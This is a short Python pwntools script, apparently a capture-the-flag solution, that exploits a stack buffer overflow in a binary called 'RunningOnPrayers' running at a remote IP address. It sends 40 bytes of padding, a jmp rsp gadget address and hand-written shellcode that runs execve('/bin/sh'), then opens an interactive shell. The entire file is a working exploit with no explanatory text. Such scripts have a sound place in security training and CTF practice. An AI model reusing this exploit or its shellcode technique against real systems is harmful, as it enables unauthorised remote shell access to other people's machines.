from pwn import *
context.terminal = ["tmux", "splitw", "-h"] # Open tmux terminal before executing script
LOCAL = False

if LOCAL:
    p = gdb.debug("./RunningOnPrayers","""
                break *0x4011ad
                continue
                """, aslr=False)
else:
    p = remote("18.212.207.74", 9001)

e = ELF("RunningOnPrayers", False)
r = ROP(e)

context.arch = "amd64"
context.os = "linux"
context.bits = "64"
shell_code = asm(
    '''
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    mov rax, 0x3b
    syscall
    '''
)
jmp_rsp = p64(0x401231) # ROPgadget --binary RunningOnPrayers --only jmp

p.recvuntil(b"but actually doing something with it")
p.send(b"A"*40 + jmp_rsp + shell_code + b"\n")

p.interactive()